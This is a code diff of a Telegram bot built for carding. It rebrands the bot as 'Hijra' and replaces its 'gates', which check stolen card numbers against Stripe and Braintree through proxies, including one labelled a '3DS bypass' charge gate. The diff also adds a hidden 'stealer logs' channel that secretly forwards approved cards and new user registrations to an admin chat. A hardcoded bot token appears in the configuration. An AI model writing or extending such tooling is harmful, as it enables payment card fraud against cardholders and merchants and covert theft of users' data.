@@ -1,6 +1,5 @@
 # ============================================================
-#  Telegram Bot — Neon
-#  made by talkneon
+#  Telegram Bot — Hijra Bot
 # ============================================================
 
 import os
@@ -16,9 +15,10 @@ import requests
 from typing import Dict, Any, Optional
 from datetime import datetime
 from auth_checker_v2 import check_card as auth_check_card, probe_site as auth_probe_site, update_config as auth_update_config, get_config as auth_get_config
-from chr1_checker import check_card as chr1_check_card, probe_site as chr1_probe_site, update_config as chr1_update_config, get_config as chr1_get_config
-from b3_checker import check_card as b3_check_card, probe_site as b3_probe_site
-from rpay_checker import check_card as rpay_check_card, probe_site as rpay_probe_site, load_rpay_sites, save_rpay_sites, validate_site as rpay_validate_site
+from sa1_checker import check_card as sa1_check_card, probe_site as sa1_probe_site
+from sa2_checker import check_card as sa2_check_card, probe_site as sa2_probe_site
+from nvbv_checker import check_card as nvbv_check_card, probe_site as nvbv_probe_site
+from chg3_checker import check_card as chg3_check_card, probe_site as chg3_probe_site
 from dlx_tools import generate_cards, vbv_lookup, analyze_url, scrape_proxies
 
 try:
@@ -37,7 +37,7 @@ except ImportError:
 #  Configuration
 # ============================================================
 BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
-DEVELOPER = "Neon"
+DEVELOPER = "Hijra"
 ADMIN_IDS = [5342093297]
 
 DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
@@ -198,16 +198,28 @@ def notify_gc(text):
 
 
 def notify_hit(user_id, username, gate_label, card_line, detail):
-    """Notify GC about a hit/approved card."""
+    """Notify GC about a hit/approved card — Hijra format."""
     name = f"@{username}" if username else str(user_id)
-    notify_gc(
-        f"<b>HIT</b>\n\n"
-        f"User: {name}\n"
-        f"Gate: <code>{gate_label}</code>\n"
-        f"Card: <code>{card_line}</code>\n"
-        f"Result: {detail}\n\n"
-        f"<i>{DEVELOPER}</i>"
+    elapsed = ""
+    if " | " in detail:
+        parts = detail.split(" | ")
+        if len(parts) >= 2:
+            elapsed = parts[-1]
+    # BIN info
+    bin6 = card_line.split("|")[0][:6] if "|" in card_line else card_line[:6]
+    hit_text = (
+        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
+        f"[🝂] CARD: <code>{card_line}</code>\n"
+        f"[🝂] GATEWAY: <code>{gate_label}</code>\n"
+        f"[🝂] STATUS: <b>APPROVED</b>\n"
+        f"[🝂] RESPONSE: <code>{detail}</code>\n\n"
+        f"<b>⍟━━━━⍟ DETAILS ⍟━━━━⍟</b>\n\n"
+        f"[🝂] BIN: <code>{bin6}</code>\n"
+        f"[🝂] TIME TOOK: <code>{elapsed}</code>\n"
+        f"[🝂] CHECKED BY: {name}"
     )
+    notify_gc(hit_text)
+    secret_log(hit_text)
 
 
 def notify_new_user(user_id, username, key_info=""):
@@ -219,6 +231,12 @@ def notify_new_user(user_id, username, key_info=""):
         f"ID: <code>{user_id}</code>\n"
         f"{key_info}\n\n"
         f"<i>{DEVELOPER}</i>"
+    )
+    secret_log(
+        f"🆕 <b>New Registration</b>\n"
+        f"User: {name}\n"
+        f"ID: <code>{user_id}</code>\n"
+        f"{key_info}"
     )
 
 
@@ -250,9 +268,10 @@ def set_gate_enabled(gate_key, enabled, by_user=None):
 # ============================================================
 GATE_PROBE_MAP = {
     "auth": {"name": "Stripe Auth", "cmd": "/chkapiauth"},
-    "chr1": {"name": "Stripe Charge", "cmd": "/chkapichr1"},
-    "b3": {"name": "Braintree Auth", "cmd": "/chkapib3"},
-    "rpay": {"name": "Razorpay Charge", "cmd": "/chkapirpay"},
+    "sa1": {"name": "Stripe Auth CCN", "cmd": "/chkapisa1"},
+    "sa2": {"name": "Stripe Auth CVV", "cmd": "/chkapisa2"},
+    "nvbv": {"name": "Braintree Non-VBV", "cmd": "/chkapinvbv"},
+    "chg3": {"name": "Stripe $3 Charge", "cmd": "/chkapichg3"},
 }
 
 
@@ -261,17 +280,14 @@ def probe_gate(gate_key):
     try:
         if gate_key == "auth":
             alive, detail = auth_probe_site()
-        elif gate_key == "chr1":
-            alive, detail = chr1_probe_site()
-        elif gate_key == "b3":
-            alive, detail = b3_probe_site()
-        elif gate_key == "rpay":
-            sites = load_rpay_sites()
-            if sites:
-                alive, detail = rpay_probe_site(sites[0])
-            else:
-                alive = False
-                detail = "No sites — add with /rpaysite"
+        elif gate_key == "sa1":
+            alive, detail = sa1_probe_site()
+        elif gate_key == "sa2":
+            alive, detail = sa2_probe_site()
+        elif gate_key == "nvbv":
+            alive, detail = nvbv_probe_site()
+        elif gate_key == "chg3":
+            alive, detail = chg3_probe_site()
         else:
             return False, 0, "Unknown gate"
 
@@ -328,7 +344,7 @@ def fmt_duration(seconds):
 
 
 def generate_key():
-    return "TN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
+    return "HJ-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
 
 
 def is_admin(user_id):
@@ -664,40 +680,25 @@ def _retry_request(func, max_retries=2, backoff=2):
 
 
 # ============================================================
-#  Shopify sites loader
+#  Stealer logs (secret GC)
 # ============================================================
-def load_shopify_sites():
-    if not os.path.exists(SITES_FILE):
-        return []
-    with open(SITES_FILE, 'r') as f:
-        return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+SECRET_GC_FILE = os.path.join(DATA_DIR, "tg_secret_gc.json")
 
+def get_secret_gc():
+    s = _load_json(SECRET_GC_FILE, {})
+    return s.get("chat_id")
 
-# ============================================================
-#  RPay sites loader + round-robin (for /rpay gate)
-# ============================================================
-_rpay_site_index = 0
-_rpay_site_lock = threading.Lock()
+def set_secret_gc(chat_id):
+    _save_json(SECRET_GC_FILE, {"chat_id": chat_id})
 
-
-def _load_rpay_sites():
-    return load_rpay_sites()
-
-
-def _save_rpay_sites(sites):
-    save_rpay_sites(sites)
-
-
-def get_next_rpay_site():
-    """Round-robin site selection for rpay gate."""
-    global _rpay_site_index
-    sites = load_rpay_sites()
-    if not sites:
-        return None
-    with _rpay_site_lock:
-        site = sites[_rpay_site_index % len(sites)]
-        _rpay_site_index += 1
-    return site
+def secret_log(text):
+    gc_id = get_secret_gc()
+    if not gc_id:
+        return
+    try:
+        send_message(gc_id, text)
+    except Exception:
+        pass
 
 
 # ============================================================
@@ -707,15 +708,14 @@ def _run_gate(gate, c_num, c_mm, c_yy, c_cvv, proxy_dict):
     cc_line = f"{c_num}|{c_mm}|{c_yy}|{c_cvv}"
     if gate == "auth":
         return auth_check_card(cc_line, proxy_dict)
-    elif gate == "chr1":
-        return chr1_check_card(cc_line, proxy_dict)
-    elif gate == "b3":
-        return b3_check_card(cc_line, proxy_dict)
-    elif gate == "rpay":
-        site_url = get_next_rpay_site()
-        if not site_url:
-            return "Error | No sites — add with /rpaysite"
-        return rpay_check_card(cc_line, proxy_dict, site_url=site_url)
+    elif gate == "sa1":
+        return sa1_check_card(cc_line, proxy_dict)
+    elif gate == "sa2":
+        return sa2_check_card(cc_line, proxy_dict)
+    elif gate == "nvbv":
+        return nvbv_check_card(cc_line, proxy_dict)
+    elif gate == "chg3":
+        return chg3_check_card(cc_line, proxy_dict)
     else:
         return auth_check_card(cc_line, proxy_dict)
 
@@ -880,10 +880,10 @@ def run_processing(lines, user_id, on_progress=None, on_complete=None, threads=D
 def fmt_start(username, user_id):
     name = f"@{username}" if username else "User"
     return (
-        f"<b>Neon</b>\n\n"
+        f"<b>⍟━━━⌁ Hijra ⌁━━━⍟</b>\n\n"
         f"Welcome, <b>{name}</b>\n"
         f"Your ID: <code>{user_id}</code>\n\n"
-        f"Use /help to see all available commands and get started.\n\n"
+        f"Use /help to see all available commands.\n\n"
         f"<i>{DEVELOPER}</i>"
     )
 
@@ -1031,23 +1031,26 @@ cancel_flags = {}
 # ============================================================
 GATE_REGISTRY = [
     ("auth", "/auth", "Stripe Auth", True),
-    ("chr1", "/chr1", "Stripe Charge", True),
-    ("b3", "/b3", "Braintree Auth", True),
-    ("rpay", "/rpay", "Razorpay Charge", True),
+    ("sa1", "/sa1", "Stripe Auth CCN", True),
+    ("sa2", "/sa2", "Stripe Auth CVV", True),
+    ("nvbv", "/nvbv", "Braintree Non-VBV", True),
+    ("chg3", "/chg3", "Stripe $3 Charge", True),
 ]
 
 GATE_MAP = {
     "/auth": ("auth", "Stripe Auth"),
-    "/chr1": ("chr1", "Stripe Charge"),
-    "/b3": ("b3", "Braintree Auth"),
-    "/rpay": ("rpay", "Razorpay Charge"),
+    "/sa1": ("sa1", "Stripe Auth CCN"),
+    "/sa2": ("sa2", "Stripe Auth CVV"),
+    "/nvbv": ("nvbv", "Braintree Non-VBV"),
+    "/chg3": ("chg3", "Stripe $3 Charge"),
 }
 
 CHKAPI_CMDS = {
     "/chkapiauth": "auth",
-    "/chkapichr1": "chr1",
-    "/chkapib3": "b3",
-    "/chkapirpay": "rpay",
+    "/chkapisa1": "sa1",
+    "/chkapisa2": "sa2",
+    "/chkapinvbv": "nvbv",
+    "/chkapichg3": "chg3",
 }
 
 
@@ -1117,11 +1120,15 @@ def handle_callback(update):
     if data == "help_gates":
         answer_callback(cb_id)
         txt = (
-            "<b>Available Gates</b>\n\n"
-            "<code>/auth</code>  ·  Stripe Auth (WooCommerce/WCPay)\n"
-            "<code>/chr1</code>  ·  Stripe Charge (WordPress AJAX)\n"
-            "<code>/b3</code>  ·  Braintree Auth (dnalasering)\n"
-            "<code>/rpay</code>  ·  Razorpay Charge\n\n"
+            "<b>⍟━━━⌁ Gates ⌁━━━⍟</b>\n\n"
+            "<b>Auth Gates:</b>\n"
+            "<code>/auth</code>  ·  Stripe Auth (WCPay)\n"
+            "<code>/sa1</code>  ·  Stripe Auth CCN\n"
+            "<code>/sa2</code>  ·  Stripe Auth CVV\n\n"
+            "<b>Charge Gates:</b>\n"
+            "<code>/chg3</code>  ·  Stripe $3 Charge (3DS bypass)\n\n"
+            "<b>Other:</b>\n"
+            "<code>/nvbv</code>  ·  Braintree Non-VBV\n\n"
             f"<i>{DEVELOPER}</i>"
         )
         if chat_id and msg_id:
@@ -1757,6 +1764,43 @@ def handle_update(update):
             f"Chat ID: <code>{target}</code>\n\n"
             f"<i>{DEVELOPER}</i>")
         return
+
+    # --- /secgcset (secret stealer log GC) ---
+    if text.startswith("/secgcset"):
+        if int(user_id) not in ADMIN_IDS:
+            return
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2:
+            current = get_secret_gc()
+            send_message(chat_id,
+                f"<b>Secret GC</b>\n\n"
+                f"Current: <code>{current or 'Not set'}</code>\n\n"
+                f"<code>/secgcset CHAT_ID</code> or <code>/secgcset here</code>\n\n"
+                f"<i>{DEVELOPER}</i>")
+            return
+        target = parts[1].strip()
+        if target.lower() == "here":
+            target = str(chat_id)
+        set_secret_gc(int(target))
+        send_message(chat_id,
+            f"<b>Secret GC Set</b>\n\n"
+            f"Chat ID: <code>{target}</code>\n\n"
+            f"<i>{DEVELOPER}</i>")
+        return
+
+    # --- /gctest ---
+    if text == "/gctest":
+        if int(user_id) not in ADMIN_IDS:
+            return
+        gc_id = get_secret_gc()
+        if not gc_id:
+            send_message(chat_id, f"<b>No secret GC configured.</b>\n\nUse /secgcset first.\n\n<i>{DEVELOPER}</i>")
+            return
+        try:
+            send_message(gc_id, "Logging system is working ✅")
+            send_message(chat_id, f"<b>Test sent successfully.</b>\n\n<i>{DEVELOPER}</i>")
+        except Exception as e:
+            send_message(chat_id, f"<b>Failed:</b> {str(e)[:60]}\n\n<i>{DEVELOPER}</i>")
 
     # --- /scrapeproxies (admin) ---
     if text == "/scrapeproxies":
